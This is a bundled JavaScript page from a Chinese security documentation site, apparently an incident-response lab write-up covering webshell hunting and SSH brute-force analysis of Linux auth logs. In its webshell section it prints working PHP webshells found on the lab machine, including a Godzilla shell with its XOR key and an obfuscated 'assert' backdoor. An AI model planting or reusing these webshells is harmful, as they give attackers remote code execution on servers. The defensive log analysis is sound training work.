"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[969],{28453:(e,n,r)=>{r.d(n,{R:()=>o,x:()=>i});var s=r(96540);const l={},a=s.createContext(l);function o(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:o(e.components),s.createElement(a.Provider,{value:n},e.children)}},75859:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>d,contentTitle:()=>i,default:()=>t,frontMatter:()=>o,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-Linux\u65e5\u5fd7\u5206\u6790","title":"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-Linux\u65e5\u5fd7\u5206\u6790","description":"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740","source":"@site/docs/\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-Linux\u65e5\u5fd7\u5206\u6790.md","sourceDirName":"\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a","slug":"/\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-Linux\u65e5\u5fd7\u5206\u6790","permalink":"/docs/\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-Linux\u65e5\u5fd7\u5206\u6790","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-Linux\u65e5\u5fd7\u5206\u6790.md","tags":[],"version":"current","frontMatter":{},"sidebar":"YingJiSidebar","previous":{"title":"\u7384\u673a","permalink":"/docs/category/\u7384\u673a"},"next":{"title":"\u7b2c\u4e5d\u7ae0 blueteam\u7684\u5c0f\u5fc3\u601d","permalink":"/docs/\u5e94\u6025\u54cd\u5e94\u9776\u673a/\u7384\u673a/\u7b2c\u4e5d\u7ae0 blueteam\u7684\u5c0f\u5fc3\u601d"}}');var l=r(74848),a=r(28453);const o={},i=void 0,d={},c=[{value:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740",id:"\u7b2c\u4e00\u7ae0-\u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740",level:2},{value:"\u7b80\u4ecb",id:"\u7b80\u4ecb",level:3},{value:"1.\u9ed1\u5ba2webshell\u91cc\u9762\u7684flag",id:"1\u9ed1\u5ba2webshell\u91cc\u9762\u7684flag",level:3},{value:"2.\u9ed1\u5ba2\u4f7f\u7528\u7684\u4ec0\u4e48\u5de5\u5177\u7684shell",id:"2\u9ed1\u5ba2\u4f7f\u7528\u7684\u4ec0\u4e48\u5de5\u5177\u7684shell",level:3},{value:"3.\u9ed1\u5ba2\u9690\u85cfshell\u7684\u5b8c\u6574\u8def\u5f84",id:"3\u9ed1\u5ba2\u9690\u85cfshell\u7684\u5b8c\u6574\u8def\u5f84",level:3},{value:"4.\u9ed1\u5ba2\u514d\u6740\u9a6c\u5b8c\u6574\u8def\u5f84",id:"4\u9ed1\u5ba2\u514d\u6740\u9a6c\u5b8c\u6574\u8def\u5f84",level:3},{value:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-Linux\u65e5\u5fd7\u5206\u6790",id:"\u7b2c\u4e00\u7ae0-\u5e94\u6025\u54cd\u5e94-linux\u65e5\u5fd7\u5206\u6790",level:2},{value:"\u7b80\u4ecb",id:"\u7b80\u4ecb-1",level:3},{value:"1.\u6709\u591a\u5c11IP\u5728\u7206\u7834\u4e3b\u673assh\u7684root\u5e10\u53f7",id:"1\u6709\u591a\u5c11ip\u5728\u7206\u7834\u4e3b\u673assh\u7684root\u5e10\u53f7",level:3},{value:"2.ssh\u7206\u7834\u6210\u529f\u767b\u9646\u7684IP\u662f\u591a\u5c11",id:"2ssh\u7206\u7834\u6210\u529f\u767b\u9646\u7684ip\u662f\u591a\u5c11",level:3},{value:"3.\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48\uff1f",id:"3\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48",level:3},{value:"4.\u767b\u9646\u6210\u529f\u7684IP\u5171\u7206\u7834\u4e86\u591a\u5c11\u6b21",id:"4\u767b\u9646\u6210\u529f\u7684ip\u5171\u7206\u7834\u4e86\u591a\u5c11\u6b21",level:3},{value:"5.\u9ed1\u5ba2\u767b\u9646\u4e3b\u673a\u540e\u65b0\u5efa\u4e86\u4e00\u4e2a\u540e\u95e8\u7528\u6237\uff0c\u7528\u6237\u540d\u662f\u591a\u5c11",id:"5\u9ed1\u5ba2\u767b\u9646\u4e3b\u673a\u540e\u65b0\u5efa\u4e86\u4e00\u4e2a\u540e\u95e8\u7528\u6237\u7528\u6237\u540d\u662f\u591a\u5c11",level:3}];function h(e){const n={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.h2,{id:"\u7b2c\u4e00\u7ae0-\u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740",children:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-webshell\u67e5\u6740"}),"\n",(0,l.jsx)(n.h3,{id:"\u7b80\u4ecb",children:"\u7b80\u4ecb"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"\u9776\u673a\u8d26\u53f7\u5bc6\u7801 root xjwebshell\r\n1.\u9ed1\u5ba2webshell\u91cc\u9762\u7684flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\r\n2.\u9ed1\u5ba2\u4f7f\u7528\u7684\u4ec0\u4e48\u5de5\u5177\u7684shell github\u5730\u5740\u7684md5 flag{md5}\r\n3.\u9ed1\u5ba2\u9690\u85cfshell\u7684\u5b8c\u6574\u8def\u5f84\u7684md5 flag{md5} \u6ce8 : /xxx/xxx/xxx/xxx/xxx.xxx\r\n4.\u9ed1\u5ba2\u514d\u6740\u9a6c\u5b8c\u6574\u8def\u5f84 md5 flag{md5}\n"})}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"1\u9ed1\u5ba2webshell\u91cc\u9762\u7684flag",children:"1.\u9ed1\u5ba2webshell\u91cc\u9762\u7684flag"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'grep -nr "eval" .\n'})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"./include/gz.php:23:            eval($payload);\r\n./include/Db/.Mysqli.php:22:            eval($payload);\r\n./shell.php:1:<?php phpinfo();@eval($_REQUEST[1]);?>\n"})}),"\n",(0,l.jsx)(n.h3,{id:"2\u9ed1\u5ba2\u4f7f\u7528\u7684\u4ec0\u4e48\u5de5\u5177\u7684shell",children:"2.\u9ed1\u5ba2\u4f7f\u7528\u7684\u4ec0\u4e48\u5de5\u5177\u7684shell"}),"\n",(0,l.jsxs)(n.p,{children:["\u67e5\u770b",(0,l.jsx)(n.code,{children:"gz.php"}),"\uff0c\u53d1\u73b0\u662f\u54e5\u65af\u62c9\u7684\u7279\u5f81"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://github.com/BeichenDream/Godzilla",children:"https://github.com/BeichenDream/Godzilla"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'<?php\r\n@session_start();\r\n@set_time_limit(0);\r\n@error_reporting(0);\r\nfunction encode($D,$K) {\r\n\tfor ($i=0;$i\r\n\t        $c = $K[$i+1&15];                                                                                                                                                 \r\n\t        $D[$i] = $D[$i]^$c;\r\n}\r\nreturn $D;\r\n}\r\n$payloadName=\'payload\';                                                                                                                                                   \r\n$key=\'3c6e0b8a9c15224a\';                                                                                                                                                  \r\n$data=file_get_contents("php://input");                                                                                                                                   \r\nif ($data!==false) {\r\n$data=encode($data,$key);                                                                                                                                             \r\n    if (isset($_SESSION[$payloadName])) {\r\n\t$payload=encode($_SESSION[$payloadName],$key);                                                                                                                    \r\n\t        if (strpos($payload,"getBasicsInfo")===false) {\r\n\t\t$payload=encode($payload,$key);\r\n\t}\r\n\teval($payload);                                                                                                                                           \r\n\t        echo encode(@run($data),$key);\r\n} else {\r\n\tif (strpos($data,"getBasicsInfo")!==false) {\r\n\t\t$_SESSION[$payloadName]=encode($data,$key);\r\n\t}\r\n}\r\n}\n'})}),"\n",(0,l.jsx)(n.h3,{id:"3\u9ed1\u5ba2\u9690\u85cfshell\u7684\u5b8c\u6574\u8def\u5f84",children:"3.\u9ed1\u5ba2\u9690\u85cfshell\u7684\u5b8c\u6574\u8def\u5f84"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"/var/www/html/include/Db/.Mysqli.php\n"})}),"\n",(0,l.jsx)(n.h3,{id:"4\u9ed1\u5ba2\u514d\u6740\u9a6c\u5b8c\u6574\u8def\u5f84",children:"4.\u9ed1\u5ba2\u514d\u6740\u9a6c\u5b8c\u6574\u8def\u5f84"}),"\n",(0,l.jsx)(n.p,{children:"\u67e5\u770bapache\u7684\u65e5\u5fd7"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"cat /var/log/apache2/access.log\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:'192.168.200.2 - - [02/Aug/2023:08:56:10 +0000] "GET /wap/top.php?fuc=ERsDHgEUC1hI&func2=ser HTTP/1.1" 500 185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\r\n192.168.200.2 - - [02/Aug/2023:08:56:24 +0000] "GET /wap/top.php?fuc=ERsDHgEUC1hI&func2=sert HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u67e5\u770btop.php\u7684\u5185\u5bb9"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'<?php\r\n\r\n$key = "password";\r\n\r\n//ERsDHgEUC1hI\r\n$fun = base64_decode($_GET[\'func\']);\r\nfor($i=0;$i<strlen($fun);$i++){\r\n    $fun[$i] = $fun[$i]^$key[$i+1&7];\r\n}\r\n$a = "a";\r\n$s = "s";\r\n$c=$a.$s.$_GET["func2"];\r\n$c($fun);\n'})}),"\n",(0,l.jsx)(n.h2,{id:"\u7b2c\u4e00\u7ae0-\u5e94\u6025\u54cd\u5e94-linux\u65e5\u5fd7\u5206\u6790",children:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-Linux\u65e5\u5fd7\u5206\u6790"}),"\n",(0,l.jsx)(n.h3,{id:"\u7b80\u4ecb-1",children:"\u7b80\u4ecb"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:'\u8d26\u53f7root\u5bc6\u7801linuxrz\r\nssh root@IP\r\n1.\u6709\u591a\u5c11IP\u5728\u7206\u7834\u4e3b\u673assh\u7684root\u5e10\u53f7\uff0c\u5982\u679c\u6709\u591a\u4e2a\u4f7f\u7528","\u5206\u5272\r\n2.ssh\u7206\u7834\u6210\u529f\u767b\u9646\u7684IP\u662f\u591a\u5c11\uff0c\u5982\u679c\u6709\u591a\u4e2a\u4f7f\u7528","\u5206\u5272\r\n3.\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48\uff1f\u5982\u679c\u6709\u591a\u4e2a\u4f7f\u7528","\u5206\u5272\r\n4.\u767b\u9646\u6210\u529f\u7684IP\u5171\u7206\u7834\u4e86\u591a\u5c11\u6b21\r\n5.\u9ed1\u5ba2\u767b\u9646\u4e3b\u673a\u540e\u65b0\u5efa\u4e86\u4e00\u4e2a\u540e\u95e8\u7528\u6237\uff0c\u7528\u6237\u540d\u662f\u591a\u5c11\n'})}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"1\u6709\u591a\u5c11ip\u5728\u7206\u7834\u4e3b\u673assh\u7684root\u5e10\u53f7",children:"1.\u6709\u591a\u5c11IP\u5728\u7206\u7834\u4e3b\u673assh\u7684root\u5e10\u53f7"}),"\n",(0,l.jsxs)(n.p,{children:["\u5728Debian\u548cUbuntu\u7b49\u53d1\u884c\u7248\u4e2d\uff0cSSH\u767b\u5f55\u4fe1\u606f\u53ef\u80fd\u4fdd\u5b58\u5728",(0,l.jsx)(n.code,{children:"/var/log/auth.log"}),"\u6587\u4ef6\u4e2d"]}),"\n",(0,l.jsxs)(n.p,{children:["\u8fd9\u91cc\u4fe1\u606f\u653e\u5728\u4e86",(0,l.jsx)(n.code,{children:"/var/log/auth.log.1"}),"\u4e2d"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'cat /var/log/auth.log.1 | gerp -a "Failed password for root"\n'})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"Aug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2\r\nAug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2\r\nAug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2\r\nAug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2\r\nAug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2\r\nAug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u5c31\u662f\u5c06\u6bcf\u884c\u7684IP\u53d6\u51fa\u6765"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"cat /var/log/auth.log.1 | grep -a \"Failed password for root\"|awk '{print $11}'\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u53bb\u9664\u91cd\u590d\u884c\uff0c\u6392\u5e8f"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"cat /var/log/auth.log.1 | grep -a \"Failed password for root\"|awk '{print $11}' | uniq -c |sort -nr\n"})}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"uniq\u7684-c\u9009\u9879\u662f\u7edf\u8ba1\u91cd\u590d\u884c\u884c\u6570"}),"\n",(0,l.jsx)(n.p,{children:"sort\u7684-n\u662f\u6309\u6570\u5b57\u6392\u5e8f\uff0c-n\u662f\u8fdb\u884c\u5012\u5e8f"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.code,{children:"flag{192.168.200.2,192.168.200.32,192.168.200.31}"})}),"\n",(0,l.jsx)(n.h3,{id:"2ssh\u7206\u7834\u6210\u529f\u767b\u9646\u7684ip\u662f\u591a\u5c11",children:"2.ssh\u7206\u7834\u6210\u529f\u767b\u9646\u7684IP\u662f\u591a\u5c11"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"cat auth.log.1 | grep -a \"Accepted password for root\" |awk '{print $11}'\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.code,{children:"flag{192.168.200.2}"})}),"\n",(0,l.jsx)(n.h3,{id:"3\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48",children:"3.\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48\uff1f"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'cat auth.log.1 | grep -a "Failed password for"| perl -e \'while($_=<>){ /for(.*?) from/; print "$1\\n";}\'| uniq -c | sort -nr\n'})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.code,{children:"flag{user,hello,root,test3,test2,test1}"})}),"\n",(0,l.jsx)(n.h3,{id:"4\u767b\u9646\u6210\u529f\u7684ip\u5171\u7206\u7834\u4e86\u591a\u5c11\u6b21",children:"4.\u767b\u9646\u6210\u529f\u7684IP\u5171\u7206\u7834\u4e86\u591a\u5c11\u6b21"}),"\n",(0,l.jsxs)(n.p,{children:["\u767b\u5f55\u6210\u529f\u7684IP\u662f",(0,l.jsx)(n.code,{children:"192.168.200.2"}),"\uff0c\u7528\u6237\u540d\u662f",(0,l.jsx)(n.code,{children:"root"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'cat auth.log.1| grep -a "Failed password for"|grep -a "root"|grep "192.168.200.2"\n'})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.code,{children:"flag{4}"})}),"\n",(0,l.jsx)(n.h3,{id:"5\u9ed1\u5ba2\u767b\u9646\u4e3b\u673a\u540e\u65b0\u5efa\u4e86\u4e00\u4e2a\u540e\u95e8\u7528\u6237\u7528\u6237\u540d\u662f\u591a\u5c11",children:"5.\u9ed1\u5ba2\u767b\u9646\u4e3b\u673a\u540e\u65b0\u5efa\u4e86\u4e00\u4e2a\u540e\u95e8\u7528\u6237\uff0c\u7528\u6237\u540d\u662f\u591a\u5c11"}),"\n",(0,l.jsxs)(n.p,{children:["\u67e5\u770b",(0,l.jsx)(n.code,{children:"/etc/passwd"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"cat /etc/passwd\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u6216\u8005"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'cat auth.log.1| grep -a "new user"\n'})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.code,{children:"flag{test2}"})})]})}function t(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(h,{...e})}):h(e)}}}]);